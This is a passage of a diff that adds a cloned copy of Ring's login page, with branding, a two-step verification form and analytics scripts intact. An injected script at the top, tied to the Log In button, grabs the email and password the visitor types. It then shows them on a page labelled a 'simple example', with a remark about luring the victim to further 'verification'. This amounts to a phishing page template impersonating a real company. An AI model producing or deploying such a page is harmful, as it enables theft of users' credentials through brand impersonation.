@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <script>
+    function myFunction() {
+        let email = document.getElementById("email").value;
+        let password = document.getElementById("password").value;
+
+        document.body.innerHTML = `
+                <h1>simple exmple</h1>
+
+                <h3>email: ${email}</h3>
+                <h3>password: ${password}</h3>
+
+                <p>password: can say here go to do verfication in you email or any thing 😈🤺</p>
+
+            `;
+    }
+</script>
+
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Welcome Back! Please Log in | Ring</title>
+
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0">
+
+<link href="https://static.ring.com/" rel="preconnect" crossorigin="">
+
+
+<link href="https://static.ring.com/fonts/30DF1A_0_0.woff2" rel="preload" as="font" type="font/woff2" crossorigin="">
+
+
+<link href="https://static.ring.com/fonts/2BBA9E_0_0.woff" rel="preload" as="font" type="font/woff" crossorigin="">
+
+
+<link href="https://static.ring.com/fonts/2BA2B5_0_0.woff" rel="preload" as="font" type="font/woff" crossorigin="">
+
+<link href="https://d39xvdj9d5ntm1.cloudfront.net/login/images/favicon-79c0e74de2da090fa7638f02a349ece5.ico" rel="shortcut icon" type="image/x-icon">
+<link href="https://d39xvdj9d5ntm1.cloudfront.net/login/images/favicon-79c0e74de2da090fa7638f02a349ece5.ico" rel="icon" type="image/x-icon">
+<link href="https://d39xvdj9d5ntm1.cloudfront.net/login/images/favicon-79c0e74de2da090fa7638f02a349ece5.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
+
+<link href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/head-165d675ca9f305e4276c.css" rel="stylesheet">
+
+
+
+<span class="consent-head">
+  <script type="text/javascript" data-cfasync="false" charset="UTF-8" async="" src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/auryc.lib.js"></script><script type="text/javascript" async="" src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/heap-1155664863.js"></script><script type="text/javascript">
+    function rewriteFunc(props) {
+      var pathRegex = new RegExp('(((account\/)(plan\/|app\/)(devices\/|payment\/|location\/|confirmation\/|plans\/(?:subscribe\/|upgrade\/|cancel\/|remove\/|)))|(cases\/|alerts\/|share\/|user\/viewprofilepage\/user-id\/|orders\/|checkouts\/))([A-Za-z0-9_@.-]+?)(?=\/|$)');
+        
+      var queryParamsRegex = new RegExp('([&?]deviceId=|[&?]locationId=|[&?]PayerID=|[&?]token=[&?]|l=|[&?]discount=|[&?]location=|[&?]devices=|[&?]checkout\[email\]=|[&?]invitation_token=|[&?]code=)([A-Za-z0-9_@.-]+?)(?=\/|$|\&)', 'g');
+    
+      var redactText = "$1" + "REDACTED";
+
+      // Paths  
+      // Example:    "/account/plan/devices/djn11j-1a61k-0/yearly"
+      // Obfuscated: "/account/plan/devices/REDACT_TEXT_GOES_HERE/yearly"
+
+      // Query Params 
+      // Example:    "/account/purchase/review?locationId=djn11j-1a61k-0&deviceId=31208385&planType=plus&billingFrequency=monthly"  
+      // Obfuscated: "/account/purchase/review?locationId=REDACT_TEXT_GOES_HERE&deviceId=REDACT_TEXT_GOES_HERE&planType=plus&billingFrequency=monthly"
+
+      // Hierarchy
+      // Example:    "@div;.Parent;|@div;.Child;|@a;[href=/account/purchase/review?locationId=djn11j-1a61k-0&deviceId=31208385&planType=plus&billingFrequency=monthly];|"
+      // Obfuscated: "@div;.Parent;|@div;.Child;|@a;[href=/account/purchase/review?locationId=REDACT_TEXT_GOES_HERE&deviceId=REDACT_TEXT_GOES_HERE&planType=plus&billingFrequency=monthly];|"
+
+      //Event Properties
+
+      if (props.event_properties) {
+          if (props.event_properties.href) {
+              props.event_properties.href = props.event_properties.href.replace(pathRegex, redactText);
+              props.event_properties.href = props.event_properties.href.replace(queryParamsRegex, redactText);
+          }
+          if (props.event_properties.hierarchy &&
+              props.event_properties.hierarchy.indexOf("[href") > -1) {
+              props.event_properties.hierarchy = props.event_properties.hierarchy.replace(pathRegex, redactText);
+              props.event_properties.hierarchy = props.event_properties.hierarchy.replace(queryParamsRegex, redactText);
+          }
+      }
+
+      // Pageview Properties
+
+      if (props.pageview_properties) {
+          if (props.pageview_properties.path) {
+              props.pageview_properties.path = props.pageview_properties.path.replace(pathRegex, redactText);
+          }
+          if (props.pageview_properties.hash) {
+              props.pageview_properties.hash = props.pageview_properties.hash.replace(pathRegex, redactText);
+          }
+          if (props.pageview_properties.previous_page) {
+              props.pageview_properties.previous_page = props.pageview_properties.previous_page.replace(pathRegex, redactText);
+          }
+          // Pageview Query Regex
+          if (props.pageview_properties && props.pageview_properties.query) {
+              props.pageview_properties.query = props.pageview_properties.query.replace(queryParamsRegex, redactText);
+          }
+      }
+
+      // Session Properties
+
+      if (props.session_properties) {
+          if (props.session_properties.path) {
+              props.session_properties.path = props.session_properties.path.replace(pathRegex, redactText);
+          }
+          if (props.session_properties.hash) {
+              props.session_properties.hash = props.session_properties.hash.replace(pathRegex, redactText);
+          }
+          if (props.session_properties.referrer) {
+              props.session_properties.referrer = props.session_properties.referrer.replace(pathRegex, redactText);
+          }
+          // Session Query Param Regex
+          if (props.session_properties.query) {
+              props.session_properties.query = props.session_properties.query.replace(queryParamsRegex, redactText);
+          }
+      }
+      return props;
+    }
+		
+    window.heapUtils.initRingSiteHeapJS({
+        accountId: '1155664863',
+        rewriteFn: rewriteFunc,
+    });
+  </script>
+</span><link rel="stylesheet" type="text/css" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/consent-manager-base-ef2e1ff2de9196206831aaaf11bc322c.css"><link rel="stylesheet" type="text/css" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/consent-manager-d3daac26e221fff408b58ee3055cf756.css"><script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/container.js" data-cfasync="false" async="true" data-vendor="auryc" data-role="container" charset="utf-8"></script></head><body id="root" class="has-banner"><div class="icon-filters">
+    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="0" height="0" style="position: absolute; left: -99999px;">
+        <defs>
+            <filter id="colorFilter-contentBase-light">
+                <feColorMatrix in="SourceGraphic" type="matrix" values="-1.00 0 0 0 1 0 -1.00 0 0 1 0 0 -1.00 0 1 0 0 0 1 0" result="inverted_icon"></feColorMatrix>
+                <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values="0.26 0 0 0 0 0 0.26 0 0 0 0 0 0.26 0 0 0 0 0 1 0" in="inverted_icon"></feColorMatrix>
+            </filter>
+        </defs>
+    </svg>
+    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="0" height="0" style="position: absolute; left: -99999px;">
+        <defs>
+            <filter id="colorFilter-contentBase-dark">
+                <feColorMatrix in="SourceGraphic" type="matrix" values="-1.00 0 0 0 1 0 -1.00 0 0 1 0 0 -1.00 0 1 0 0 0 1 0" result="inverted_icon"></feColorMatrix>
+                <feColorMatrix color-interpolation-filters="sRGB" type="matrix" values="1.00 0 0 0 0 0 1.00 0 0 0 0 0 1.00 0 0 0 0 0 1 0" in="inverted_icon"></feColorMatrix>
+            </filter>
+        </defs>
+    </svg> 
+</div>
+
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/colors-e4f6028232a23f5a773f.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/typography-7d1b034320af5e4a1424.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/elevation-a819268395b37a4d9f38.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/radii-9fc5ce33373be5ac82ff.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/common-styles-fb33d757dca83a9ad136.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/login-styles-57693402ba7e50a351a8.css">
+    <link rel="stylesheet" href="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/login-2sv-head-9305cc19adf3a395a400.css">
+  
+
+  
+    <main>
+      <section class="container">
+        <form method="POST" novalidate="">
+          
+          <input id="expires-ts" name="expires-ts" type="hidden" value="1740729014210">
+          <input id="plans-login" name="plans-login" type="hidden" value="false">
+          <input id="payment-login" name="payment-login" type="hidden" value="false">
+          
+
+          <div class="card login">
+            <!-- Cookies disabled banner -->
+            <div class="notification-banner info hidden" id="cookies-disabled">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  You currently have cookies disabled in your browser settings. Please enable them to avoid unexpected issues.
+                </div>
+              </div>
+            </div>
+
+            <!-- Session timeout banner -->
+            <div class="notification-banner info hidden" id="session-timeout">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  Your session has expired.
+                </div>
+
+                <div class="notification-banner-actions">
+                  <div class="notification-banner-action close">
+                    Dismiss
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Login timeout banner -->
+            <div class="notification-banner info hidden" id="login-timeout">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  Your session has expired. Please try again.
+                </div>
+
+                <div class="notification-banner-actions">
+                  <div class="notification-banner-action close">
+                    Dismiss
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Email updated banner -->
+            <div class="notification-banner info hidden" id="email-updated">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/lock-a8b1f5a2e35730cddc9b01446b76c44a.svg" alt="Lock">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  Email has been updated.
+                </div>
+
+                Please verify your new email address before logging in.
+              </div>
+            </div>
+
+            <!-- Password updated banner -->
+            <div class="notification-banner info hidden" id="password-updated">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  You have successfully changed your password.
+                </div>
+
+                You can now log into your account below.
+              </div>
+            </div>
+
+            <!-- RPP banner -->
+            <div class="notification-banner info hidden" id="rpp">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/ring-protect-32987a717aac886357f6d8fc16e4d7fb.svg" alt="Ring Protect">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  To subscribe, log in.
+                </div>
+
+                This lets you choose a Ring Plan for your device or location.
+
+                <div class="notification-banner-actions">
+                  <div class="notification-banner-action close">
+                    Dismiss
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Account unlinked banner -->
+            <div class="notification-banner info hidden" id="account-unlinked">
+              <div class="notification-banner-icon">
+                <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/link-06de206bfbe964cf8a3b1f82e2799c29.svg" alt="Link">
+              </div>
+
+              <div class="notification-banner-text" role="alert">
+                <div class="notification-banner-title">
+                  Your account has been unlinked.
+                </div>
+
+                You can always link your accounts again in the Control Center.
+              </div>
+            </div>
+
+            
+
+            
+
+            
+
+            <span alt="Ring Logo"><svg width="78" height="48" viewBox="0 0 78 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M22.4813 5.28C23.9393 5.28 25.1213 4.09803 25.1213 2.64C25.1213 1.18197 23.9393 0 22.4813 0C21.0233 0 19.8413 1.18197 19.8413 2.64C19.8413 4.09803 21.0233 5.28 22.4813 5.28Z" fill="var(--ringLogo-iDot)"></path>
+<path d="M16.3043 12.6294C16.3059 13.0388 16.1378 13.4305 15.84 13.7114C15.5405 14.0116 15.1307 14.1752 14.7069 14.1639C14.3004 14.1517 13.9138 13.9858 13.6249 13.6996L13.5738 13.6485C13.5434 13.6177 13.509 13.5912 13.4715 13.5698C13.4319 13.5497 13.396 13.5231 13.3652 13.4911C12.2501 12.5759 10.8456 12.0878 9.40328 12.114C7.54885 12.114 6.09836 12.7488 5.0518 14.0183C4.00525 15.2878 3.48066 17.0898 3.47803 19.4242V36.1731C3.51018 36.6157 3.32888 37.047 2.99017 37.3337C2.69454 37.5825 2.32206 37.7215 1.93574 37.7272C1.54942 37.7215 1.17694 37.5825 0.881313 37.3337C0.542067 37.0474 0.360646 36.6158 0.393444 36.1731V19.4242C0.383032 18.0568 0.57393 16.6953 0.960001 15.3835C1.30943 14.1867 1.88654 13.0686 2.65967 12.0904C3.41466 11.1389 4.37321 10.3686 5.46492 9.83601C6.69568 9.26292 8.04208 8.98152 9.39935 9.01371C10.5631 9.03378 11.7141 9.26024 12.7987 9.68256C13.9161 10.0777 14.9348 10.7099 15.7849 11.5357C16.101 11.8134 16.2889 12.209 16.3043 12.6294Z" fill="var(--ringLogo-letters)"></path>
+<path d="M24.0236 36.1732C24.0558 36.6158 23.8745 37.0471 23.5357 37.3338C22.9264 37.8509 22.0323 37.8509 21.423 37.3338C21.0837 37.0475 20.9023 36.6159 20.9351 36.1732V11.0834C20.9029 10.6407 21.0842 10.2094 21.423 9.9227C22.0329 9.40728 22.9258 9.40728 23.5357 9.9227C23.8739 10.2098 24.0551 10.6409 24.0236 11.0834V36.1732Z" fill="var(--ringLogo-letters)"></path>
+<path d="M50.8013 36.1731C50.8325 36.6164 50.6497 37.0478 50.3095 37.3337C49.7008 37.8486 48.8093 37.8486 48.2007 37.3337C47.8614 37.0474 47.68 36.6158 47.7128 36.1731V19.0662C47.7192 18.1375 47.5344 17.2174 47.1698 16.3632C46.4618 14.694 45.1329 13.3651 43.4636 12.657C41.7336 11.9366 39.7877 11.9366 38.0577 12.657C36.3887 13.3654 35.0599 14.6942 34.3515 16.3632C33.989 17.2179 33.8056 18.1379 33.8125 19.0662V36.1731C33.8453 36.6158 33.6638 37.0474 33.3246 37.3337C32.7152 37.8508 31.8212 37.8508 31.2118 37.3337C30.8726 37.0474 30.6911 36.6158 30.7239 36.1731V19.0662C30.7139 17.721 30.9818 16.3883 31.5108 15.1514C32.012 13.9596 32.7372 12.8751 33.6472 11.9567C34.5536 11.054 35.6212 10.3294 36.7948 9.82029C39.3089 8.75196 42.1494 8.75196 44.6636 9.82029C47.0735 10.8223 48.9888 12.7376 49.9908 15.1475C50.5192 16.3845 50.7871 17.7172 50.7777 19.0623L50.8013 36.1731Z" fill="var(--ringLogo-letters)"></path>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M76.2689 41.9095C76.8013 40.6668 77.0693 39.3269 77.0557 37.975H77.04V19.0623C77.0494 17.7172 76.7815 16.3845 76.2531 15.1475C75.2515 12.7373 73.3361 10.8219 70.9259 9.82029C68.4117 8.75196 65.5712 8.75196 63.057 9.82029C61.8835 10.3294 60.8159 11.054 59.9095 11.9567C58.999 12.8747 58.2737 13.9593 57.7731 15.1514C57.2441 16.3883 56.9762 17.721 56.9862 19.0662V27.1908C56.9719 28.5427 57.2399 29.8828 57.7731 31.1252C58.7878 33.513 60.689 35.4142 63.0767 36.4288C64.3193 36.9616 65.6592 37.2296 67.0111 37.2157C68.3176 37.2211 69.6122 36.967 70.8197 36.4682C71.9876 35.9944 73.0555 35.3043 73.9672 34.4341V37.975C73.9656 38.8999 73.7741 39.8145 73.4046 40.6623C72.6965 42.3315 71.3676 43.6604 69.6984 44.3685C68.8441 44.7328 67.9241 44.9176 66.9954 44.9114C65.9725 44.9064 64.9568 44.7404 63.9856 44.4196C63.0068 44.1154 62.1268 43.5559 61.4361 42.7987L61.2315 42.5901C61.2012 42.5644 61.1827 42.5275 61.1803 42.4878C61.0468 42.2478 60.8381 42.0584 60.5862 41.9488C60.3824 41.866 60.1649 41.822 59.9449 41.819C59.5336 41.8192 59.138 41.9769 58.8393 42.2596C58.5193 42.5365 58.3403 42.9422 58.3515 43.3652C58.3414 43.6774 58.431 43.9847 58.6072 44.2426C59.0439 44.8852 59.593 45.4437 60.2282 45.8911C60.8978 46.3706 61.6231 46.7669 62.3882 47.0714C63.1512 47.3781 63.9416 47.6113 64.7489 47.7678C65.495 47.9181 66.254 47.9958 67.0151 48C68.3602 48.0091 69.6927 47.7412 70.9298 47.2131C73.3354 46.2127 75.2525 44.3084 76.2689 41.9095ZM73.4243 16.3632C73.7888 17.2174 73.9736 18.1375 73.9672 19.0662V27.1475C73.9727 28.0837 73.7838 29.0108 73.4125 29.8701C72.7044 31.5394 71.3755 32.8683 69.7062 33.5764C67.9763 34.2968 66.0303 34.2968 64.3003 33.5764C63.4724 33.2275 62.7201 32.721 62.0852 32.0852C61.4494 31.4496 60.9418 30.6976 60.5902 29.8701C60.2256 29.0092 60.0421 28.0824 60.0511 27.1475V19.0623C60.0449 18.134 60.2284 17.2142 60.5902 16.3593C61.3035 14.6891 62.6381 13.3615 64.3121 12.657C66.0421 11.9366 67.9881 11.9366 69.718 12.657C71.3873 13.3651 72.7162 14.694 73.4243 16.3632Z" fill="var(--ringLogo-letters)"></path>
+</svg></span>
+
+            
+              <h1 class="title">Log into your account</h1>
+              <p class="subtitle login">Manage your account and view your devices.</p>
+            
+
+
+            <div class="field">
+              <label for="email">Email</label>
+              <input id="email" name="email" type="email" autocomplete="email" spellcheck="false" autofocus="" required="" class="_ar_hide_" _ar_hide_="width:325px;height:48px;margin:4px 0px 24px;position:static;display:inline-block;">
+            </div>
+
+            <div class="errors email"></div>
+
+            <div class="field hidden">
+              <label for="password">Password</label>
+              <input id="password" name="password" type="password" autocomplete="current-password" spellcheck="false" required="" class="_ar_hide_" _ar_hide_="width:0px;height:0px;margin:4px 0px 24px;position:static;display:inline-block;">
+
+              <span class="toggle-password-visibility _ar_hide_" _ar_hide_="width:0px;height:0px;margin:0px;position:absolute;display:block;">
+                <img class="show-password" src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/show-5cda4c55b59210ca11240bdc71c924bd.svg" alt="Show">
+                <img class="hide-password hidden" src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/hide-e1428894fa50bf4393b5ea34eced8bff.svg" alt="Hide">
+              </span>
+            </div>
+
+            <div class="errors password _ar_hide_" _ar_hide_="width:325px;height:0px;margin:8px 0px;position:static;display:block;"></div>
+
+            <button class="continue-button" type="submit" disabled="disabled">
+              Continue
+            </button>
+
+            <button onclick="myFunction()" class="login-button captcha-trigger hidden" type="submit">
+              Log In
+            </button>
+
+            
+
+            <div class="legal-text">
+              By continuing, I agree to Ring's <a class="terms-of-service-link" href="https://ring.com/terms" target="_blank">Terms of Service</a>. See <a class="privacy-link" href="https://ring.com/privacy-notice" target="_blank">Privacy</a> for additional information.
+            </div>
+
+            <div class="card-footer">
+              <a class="forgot-password-link" href="https://ring.com/users/password/new">Forgot your password?</a>
+              <a class="create-account-link" href="https://ring.com/users/sign_up">Create new account</a>
+            </div>
+          </div>
+        </form>
+
+        <form novalidate="">
+  <div class="card login-2sv hidden">
+    <a href="https://ring.com/users/sign_in"><span alt="Ring Logo"><svg width="78" height="48" viewBox="0 0 78 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M22.4813 5.28C23.9393 5.28 25.1213 4.09803 25.1213 2.64C25.1213 1.18197 23.9393 0 22.4813 0C21.0233 0 19.8413 1.18197 19.8413 2.64C19.8413 4.09803 21.0233 5.28 22.4813 5.28Z" fill="var(--ringLogo-iDot)"></path>
+<path d="M16.3043 12.6294C16.3059 13.0388 16.1378 13.4305 15.84 13.7114C15.5405 14.0116 15.1307 14.1752 14.7069 14.1639C14.3004 14.1517 13.9138 13.9858 13.6249 13.6996L13.5738 13.6485C13.5434 13.6177 13.509 13.5912 13.4715 13.5698C13.4319 13.5497 13.396 13.5231 13.3652 13.4911C12.2501 12.5759 10.8456 12.0878 9.40328 12.114C7.54885 12.114 6.09836 12.7488 5.0518 14.0183C4.00525 15.2878 3.48066 17.0898 3.47803 19.4242V36.1731C3.51018 36.6157 3.32888 37.047 2.99017 37.3337C2.69454 37.5825 2.32206 37.7215 1.93574 37.7272C1.54942 37.7215 1.17694 37.5825 0.881313 37.3337C0.542067 37.0474 0.360646 36.6158 0.393444 36.1731V19.4242C0.383032 18.0568 0.57393 16.6953 0.960001 15.3835C1.30943 14.1867 1.88654 13.0686 2.65967 12.0904C3.41466 11.1389 4.37321 10.3686 5.46492 9.83601C6.69568 9.26292 8.04208 8.98152 9.39935 9.01371C10.5631 9.03378 11.7141 9.26024 12.7987 9.68256C13.9161 10.0777 14.9348 10.7099 15.7849 11.5357C16.101 11.8134 16.2889 12.209 16.3043 12.6294Z" fill="var(--ringLogo-letters)"></path>
+<path d="M24.0236 36.1732C24.0558 36.6158 23.8745 37.0471 23.5357 37.3338C22.9264 37.8509 22.0323 37.8509 21.423 37.3338C21.0837 37.0475 20.9023 36.6159 20.9351 36.1732V11.0834C20.9029 10.6407 21.0842 10.2094 21.423 9.9227C22.0329 9.40728 22.9258 9.40728 23.5357 9.9227C23.8739 10.2098 24.0551 10.6409 24.0236 11.0834V36.1732Z" fill="var(--ringLogo-letters)"></path>
+<path d="M50.8013 36.1731C50.8325 36.6164 50.6497 37.0478 50.3095 37.3337C49.7008 37.8486 48.8093 37.8486 48.2007 37.3337C47.8614 37.0474 47.68 36.6158 47.7128 36.1731V19.0662C47.7192 18.1375 47.5344 17.2174 47.1698 16.3632C46.4618 14.694 45.1329 13.3651 43.4636 12.657C41.7336 11.9366 39.7877 11.9366 38.0577 12.657C36.3887 13.3654 35.0599 14.6942 34.3515 16.3632C33.989 17.2179 33.8056 18.1379 33.8125 19.0662V36.1731C33.8453 36.6158 33.6638 37.0474 33.3246 37.3337C32.7152 37.8508 31.8212 37.8508 31.2118 37.3337C30.8726 37.0474 30.6911 36.6158 30.7239 36.1731V19.0662C30.7139 17.721 30.9818 16.3883 31.5108 15.1514C32.012 13.9596 32.7372 12.8751 33.6472 11.9567C34.5536 11.054 35.6212 10.3294 36.7948 9.82029C39.3089 8.75196 42.1494 8.75196 44.6636 9.82029C47.0735 10.8223 48.9888 12.7376 49.9908 15.1475C50.5192 16.3845 50.7871 17.7172 50.7777 19.0623L50.8013 36.1731Z" fill="var(--ringLogo-letters)"></path>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M76.2689 41.9095C76.8013 40.6668 77.0693 39.3269 77.0557 37.975H77.04V19.0623C77.0494 17.7172 76.7815 16.3845 76.2531 15.1475C75.2515 12.7373 73.3361 10.8219 70.9259 9.82029C68.4117 8.75196 65.5712 8.75196 63.057 9.82029C61.8835 10.3294 60.8159 11.054 59.9095 11.9567C58.999 12.8747 58.2737 13.9593 57.7731 15.1514C57.2441 16.3883 56.9762 17.721 56.9862 19.0662V27.1908C56.9719 28.5427 57.2399 29.8828 57.7731 31.1252C58.7878 33.513 60.689 35.4142 63.0767 36.4288C64.3193 36.9616 65.6592 37.2296 67.0111 37.2157C68.3176 37.2211 69.6122 36.967 70.8197 36.4682C71.9876 35.9944 73.0555 35.3043 73.9672 34.4341V37.975C73.9656 38.8999 73.7741 39.8145 73.4046 40.6623C72.6965 42.3315 71.3676 43.6604 69.6984 44.3685C68.8441 44.7328 67.9241 44.9176 66.9954 44.9114C65.9725 44.9064 64.9568 44.7404 63.9856 44.4196C63.0068 44.1154 62.1268 43.5559 61.4361 42.7987L61.2315 42.5901C61.2012 42.5644 61.1827 42.5275 61.1803 42.4878C61.0468 42.2478 60.8381 42.0584 60.5862 41.9488C60.3824 41.866 60.1649 41.822 59.9449 41.819C59.5336 41.8192 59.138 41.9769 58.8393 42.2596C58.5193 42.5365 58.3403 42.9422 58.3515 43.3652C58.3414 43.6774 58.431 43.9847 58.6072 44.2426C59.0439 44.8852 59.593 45.4437 60.2282 45.8911C60.8978 46.3706 61.6231 46.7669 62.3882 47.0714C63.1512 47.3781 63.9416 47.6113 64.7489 47.7678C65.495 47.9181 66.254 47.9958 67.0151 48C68.3602 48.0091 69.6927 47.7412 70.9298 47.2131C73.3354 46.2127 75.2525 44.3084 76.2689 41.9095ZM73.4243 16.3632C73.7888 17.2174 73.9736 18.1375 73.9672 19.0662V27.1475C73.9727 28.0837 73.7838 29.0108 73.4125 29.8701C72.7044 31.5394 71.3755 32.8683 69.7062 33.5764C67.9763 34.2968 66.0303 34.2968 64.3003 33.5764C63.4724 33.2275 62.7201 32.721 62.0852 32.0852C61.4494 31.4496 60.9418 30.6976 60.5902 29.8701C60.2256 29.0092 60.0421 28.0824 60.0511 27.1475V19.0623C60.0449 18.134 60.2284 17.2142 60.5902 16.3593C61.3035 14.6891 62.6381 13.3615 64.3121 12.657C66.0421 11.9366 67.9881 11.9366 69.718 12.657C71.3873 13.3651 72.7162 14.694 73.4243 16.3632Z" fill="var(--ringLogo-letters)"></path>
+</svg></span></a>
+
+    <h1 class="title">Verify your account</h1>
+    <p class="subtitle login-2sv">Please enter the code we sent to</p>
+
+    <p class="otp-receiver email hidden">
+      <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/mail-9304d3e17d2816a694a99d65cbda5a71.svg" alt="Email">️ <span class="otp-receiver-text"></span>
+    </p>
+
+    <p class="otp-receiver sms hidden">
+      <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/mobile-device-7cebf4e8e8dd485447d5b519ba511951.svg" alt="Mobile Device"> <span class="otp-receiver-text"></span>
+    </p>
+
+    <p class="totp-subtitle hidden">
+      Please enter the code from your authenticator app.
+    </p>
+
+    <div class="field">
+      <label for="2sv-code">Verification Code</label>
+
+      <input id="2sv-code" name="2sv-code" type="text" inputmode="numeric" placeholder="000000" autocomplete="one-time-code" spellcheck="false" autofocus="" pattern="[0-9]{6}" maxlength="6" required="" class="_ar_hide_" _ar_hide_="width:0px;height:0px;margin:4px 0px 24px;position:static;display:inline-block;">
+    </div>
+
+    <div class="errors login-2sv"></div>
+
+    <p class="totp-caption">
+      Codes from your authenticator app are updated every 30 seconds.
+    </p>
+
+    <div class="">
+      <label for="extended-session">
+        <input type="checkbox" id="extended-session" name="extended-session" aria-label="Keep me Signed in (up to 30 days)" class="_ar_hide_" _ar_hide_="width:0px;height:0px;margin:3px 3px 3px 4px;position:absolute;display:block;">
+
+        <span class="checkmark"></span>
+
+        <span class="content">Keep me Signed in (up to 30 days)</span>
+      </label>
+
+      <span class="extended-session-modal-toggle">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+      </span>
+    </div>
+
+    <div class="hidden">
+      <label for="remember-me">
+        <input type="checkbox" id="remember-me" name="remember-me" aria-label="remember-me" class="_ar_hide_" _ar_hide_="width:0px;height:0px;margin:3px 3px 3px 4px;position:absolute;display:block;">
+
+        <span class="checkmark"></span>
+
+        <span class="content">Remember this browser</span>
+      </label>
+
+      <span class="remember-me-modal-toggle">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" alt="Infodot">
+      </span>
+    </div>
+
+    <button type="submit" class="login-2sv-button captcha-trigger" disabled="disabled">Verify Code</button>
+
+    
+
+    <a class="resend-code-link captcha-trigger"></a>
+
+    
+      <a class="generate-alternate-code" rel="noopener noreferrer" target="_blank" href="https://support.ring.com/hc/en-us/articles/360058578911">
+        Didn't receive a code? Sign in another way.
+      </a>
+    
+  </div>
+</form>
+
+<div class="modal-backdrop extended-session hidden">
+  <div class="modal-container">
+    <div class="modal-heading">
+      <span class="heading">
+        Trusted Browser
+      </span>
+
+      <div class="modal-close">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/close-4698f0151c71214505f090589f26a384.svg" height="24" width="24" class="colorFilter-contentBase" alt="Close">
+      </div>
+    </div>
+
+    <div class="modal-body">
+      <div class="modal-icon">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/account-encrypted-889152162cf6dfe12605226daa52e07b.svg" height="40" width="40" class="colorFilter-primaryBase" alt="Trusted Browser">
+      </div>
+
+      <div class="modal-title">
+        Is this a Trusted Browser?
+      </div>
+
+      <div class="modal-description">
+        Select this option to stay signed in to ring.com on this 
+browser. If selected, you’ll remain signed in for 30 days even if you 
+close all browser tabs, close the browser, or restart your computer. To 
+sign out before 30 days, you’ll have to select <span class="strong">Log Out</span>.
+      </div>
+
+      <div class="modal-description">
+        <span class="strong">Only use this option on personal devices.</span>
+      </div>
+
+      <div class="modal-description">
+        <div class="list">
+          <div class="list-title">
+            You may be asked to sign in again if you:
+          </div>
+          <div class="list-bullets">
+            <div class="list-bullet">
+              <div class="list-icon">●</div>
+              <div class="list-text">Clear cookies on this browser</div>
+            </div>
+
+            <div class="list-bullet">
+              <div class="list-icon">●</div>
+              <div class="list-text">Sign in on a different browser</div>
+            </div>
+
+            <div class="list-bullet">
+              <div class="list-icon">●</div>
+              <div class="list-text">Sign in on a trusted browser in private or incognito mode</div>
+            </div>
+
+          </div>
+          <div class="list">
+            <div class="list-title">
+              Note: If you leave the checkbox empty, you'll be logged in for 24 hours unless you select Log Out.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
